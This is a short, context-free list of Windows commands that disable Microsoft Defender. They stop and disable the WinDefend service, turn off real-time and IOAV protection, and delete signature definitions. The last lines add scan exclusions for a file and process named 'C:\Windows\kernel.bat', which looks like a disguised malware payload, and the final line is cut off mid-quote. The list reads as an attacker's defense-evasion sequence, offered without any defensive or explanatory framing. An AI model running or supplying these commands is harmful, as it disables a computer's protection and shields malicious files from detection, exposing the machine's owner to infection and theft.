sc stop WinDefend
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true
powershell -command Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
powershell -command Set-MpPreference -DisableIOAVProtection $true
MpCmdRun -RemoveDefinitions -All
MpCmdRun -RemoveDefinitions -DynamicSignatures
powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath "C:\Windows\kernel.bat"
Add-MpPreference -ExclusionProcess "C:\Windows\kernel.bat 
